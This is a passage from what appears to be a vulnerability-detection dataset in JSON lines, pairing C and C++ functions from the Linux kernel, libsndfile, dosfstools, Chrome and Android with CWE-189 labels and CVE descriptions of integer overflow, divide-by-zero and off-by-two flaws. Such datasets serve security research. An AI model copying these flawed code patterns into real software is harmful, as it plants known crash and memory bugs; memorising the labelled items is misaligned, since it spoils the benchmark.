ERR_PTR(-EFAULT);\nEinval:\n\treturn ERR_PTR(-EINVAL);\nEnomem:\n\treturn ERR_PTR(-ENOMEM);\nEagain:\n\treturn ERR_PTR(-EAGAIN);\n}\n", "func_hash": 156075716194415668087145794571082904074, "file_name": "mremap.c", "file_hash": 191286780299224623789483530836749571575, "cwe": ["CWE-189"], "cve": "CVE-2011-2496", "cve_desc": "Integer overflow in the vma_to_resize function in mm/mremap.c in the Linux kernel before 2.6.39 allows local users to cause a denial of service (BUG_ON and system crash) via a crafted mremap system call that expands a memory mapping.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-2496"}
{"idx": 44278, "project": "libsndfile", "commit_id": "725c7dbb95bfaf8b4bb7b04820e3a00cceea9ce6", "project_url": "https://github.com/erikd/libsndfile", "commit_url": "https://github.com/erikd/libsndfile/commit/725c7dbb95bfaf8b4bb7b04820e3a00cceea9ce6", "commit_message": "src/file_io.c : Prevent potential divide-by-zero.\n\nCloses: https://github.com/erikd/libsndfile/issues/92", "target": 0, "func": "psf_fwrite (const void *ptr, sf_count_t bytes, sf_count_t items, SF_PRIVATE *psf)\n{\tsf_count_t total = 0 ;\n\tssize_t\tcount ;\n\n\tif (psf->virtual_io)\n\t\treturn psf->vio.write (ptr, bytes*items, psf->vio_user_data) / bytes ;\n\n\titems *= bytes ;\n\n\t/* Do this check after the multiplication above. */\n\tif (items <= 0)\n\t\treturn 0 ;\n\n\twhile (items > 0)\n\t{\t/* Break the writes down to a sensible size. */\n\t\tcount = (items > SENSIBLE_SIZE) ? SENSIBLE_SIZE : items ;\n\n\t\tcount = write (psf->file.filedes, ((const char*) ptr) + total, count) ;\n\n\t\tif (count == -1)\n\t\t{\tif (errno == EINTR)\n\t\t\t\tcontinue ;\n\n\t\t\tpsf_log_syserr (psf, errno) ;\n\t\t\tbreak ;\n\t\t\t} ;\n\n\t\tif (count == 0)\n\t\t\tbreak ;\n\n\t\ttotal += count ;\n\t\titems -= count ;\n\t\t} ;\n\n\treturn total / bytes ;\n} /* psf_fwrite */\n", "func_hash": 300658478914303180689662660657494997220, "file_name": "file_io.c", "file_hash": 207124311700953691198999422851135970057, "cwe": ["CWE-189"], "cve": "CVE-2014-9756", "cve_desc": "The psf_fwrite function in file_io.c in libsndfile allows attackers to cause a denial of service (divide-by-zero error and application crash) via unspecified vectors related to the headindex variable.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-9756"}
{"idx": 184494, "project": "dosfstools", "commit_id": "07908124838afcc99c577d1d3e84cef2dbd39cb7", "project_url": "https://github.com/dosfstools/dosfstools", "commit_url": "https://github.com/dosfstools/dosfstools/commit/07908124838afcc99c577d1d3e84cef2dbd39cb7", "commit_message": "set_fat(): Fix off-by-2 error leading to corruption in FAT12\n\nIn FAT12 two 12 bit entries are combined to a 24 bit value (three\nbytes). Therefore, when an even numbered FAT entry is set in FAT12, it\nmust be be combined with the following entry. To prevent accessing\nbeyond the end of the FAT array, it must be checked that the cluster is\nnot the last one.\n\nPreviously, the check tested that the requested cluster was equal to\nfs->clusters - 1. However, fs->clusters is the number of data clusters\nnot including the two reserved FAT entries at the start so the test\ntriggered two clusters early.\n\nIf the third to last entry was written on a FAT12 filesystem with an\nodd number of clusters, the second to last entry would be corrupted.\nThis corruption may also lead to invalid memory accesses when the\ncorrupted entry becomes out of bounds and is used later.\n\nChange the test to fs->clusters + 1 to fix.\n\nReported-by: Hanno B\u00f6ck\nSigned-off-by: Andreas Bombe <aeb@debian.org>", "target": 0, "func": "void set_fat(DOS_FS * fs, uint32_t cluster, int32_t new)\n{\n    unsigned char *data = NULL;\n    int size;\n    loff_t offs;\n\n    if (new == -1)\n\tnew = FAT_EOF(fs);\n    else if ((long)new == -2)\n\tnew = FAT_BAD(fs);\n    switch (fs->fat_bits) {\n    case 12:\n\tdata = fs->fat + cluster * 3 / 2;\n\toffs = fs->fat_start + cluster * 3 / 2;\n\tif (cluster & 1) {\n\t    FAT_ENTRY prevEntry;\n\t    get_fat(&prevEntry, fs->fat, cluster - 1, fs);\n\t    data[0] = ((new & 0xf) << 4) | (prevEntry.value >> 8);\n \t    data[1] = new >> 4;\n \t} else {\n \t    FAT_ENTRY subseqEntry;\n\t    if (cluster != fs->clusters + 1)\n \t\tget_fat(&subseqEntry, fs->fat, cluster + 1, fs);\n \t    else\n \t\tsubseqEntry.value = 0;\n\t    data[0] = new & 0xff;\n\t    data[1] = (new >> 8) | ((0xff & subseqEntry.value) << 4);\n\t}\n\tsize = 2;\n\tbreak;\n    case 16:\n\tdata = fs->fat + cluster * 2;\n\toffs = fs->fat_start + cluster * 2;\n\t*(unsigned short *)data = htole16(new);\n\tsize = 2;\n\tbreak;\n    case 32:\n\t{\n\t    FAT_ENTRY curEntry;\n\t    get_fat(&curEntry, fs->fat, cluster, fs);\n\n\t    data = fs->fat + cluster * 4;\n\t    offs = fs->fat_start + cluster * 4;\n\t    /* According to M$, the high 4 bits of a FAT32 entry are reserved and\n\t     * are not part of the cluster number. So we never touch them. */\n\t    *(uint32_t *)data = htole32((new & 0xfffffff) |\n\t\t\t\t\t     (curEntry.reserved << 28));\n\t    size = 4;\n\t}\n\tbreak;\n    default:\n\tdie(\"Bad FAT entry size: %d bits.\", fs->fat_bits);\n    }\n    fs_write(offs, size, data);\n    if (fs->nfats > 1) {\n\tfs_write(offs + fs->fat_size, size, data);\n    }\n}\n", "func_hash": 208429240369048852614438814656211303800, "file_name": "fat.c", "file_hash": 258057985473446598986931599029975037090, "cwe": ["CWE-189"], "cve": "CVE-2015-8872", "cve_desc": "The set_fat function in fat.c in dosfstools before 4.0 might allow attackers to corrupt a FAT12 filesystem or cause a denial of service (invalid memory read and crash) by writing an odd number of clusters to the third to last entry on a FAT12 filesystem, which triggers an \"off-by-two error.\"", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-8872"}
{"idx": 184951, "project": "Chrome", "commit_id": "b2006ac87cec58363090e7d5e10d5d9e3bbda9f9", "project_url": "https://github.com/chromium/chromium", "commit_url": "https://github.com/chromium/chromium/commit/b2006ac87cec58363090e7d5e10d5d9e3bbda9f9", "commit_message": "None", "target": 0, "func": "static bool CheckMov(const uint8* buffer, int buffer_size) {\n  RCHECK(buffer_size > 8);\n \n   int offset = 0;\n   while (offset + 8 < buffer_size) {\n    uint32 atomsize = Read32(buffer + offset);\n     uint32 atomtype = Read32(buffer + offset + 4);\n     switch (atomtype) {\n      case TAG('f','t','y','p'):\n      case TAG('p','d','i','n'):\n      case TAG('m','o','o','v'):\n      case TAG('m','o','o','f'):\n      case TAG('m','f','r','a'):\n      case TAG('m','d','a','t'):\n      case TAG('f','r','e','e'):\n      case TAG('s','k','i','p'):\n      case TAG('m','e','t','a'):\n      case TAG('m','e','c','o'):\n      case TAG('s','t','y','p'):\n      case TAG('s','i','d','x'):\n      case TAG('s','s','i','x'):\n      case TAG('p','r','f','t'):\n      case TAG('b','l','o','c'):\n        break;\n      default:\n        return false;\n    }\n    if (atomsize == 1) {\n      if (offset + 16 > buffer_size)\n        break;\n      if (Read32(buffer + offset + 8) != 0)\n         break;  // Offset is way past buffer size.\n       atomsize = Read32(buffer + offset + 12);\n     }\n    if (atomsize == 0 || atomsize > static_cast<size_t>(buffer_size))\n       break;  // Indicates the last atom or length too big.\n     offset += atomsize;\n   }\n  return true;\n}\n", "func_hash": 96388809046961005338503697596106553292, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2014-7908", "cve_desc": "Multiple integer overflows in the CheckMov function in media/base/container_names.cc in Google Chrome before 39.0.2171.65 allow remote attackers to cause a denial of service or possibly have unspecified other impact via a large atom in (1) MPEG-4 or (2) QuickTime .mov data.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-7908"}
{"idx": 185163, "project": "Android", "commit_id": "6fe85f7e15203e48df2cc3e8e1c4bc6ad49dc968", "project_url": "None", "commit_url": "https://android.googlesource.com/platform/frameworks/av/+/6fe85f7e15203e48df2cc3e8e1c4bc6ad49dc968", "commit_message": "None", "target": 0, "func": "status_t MPEG4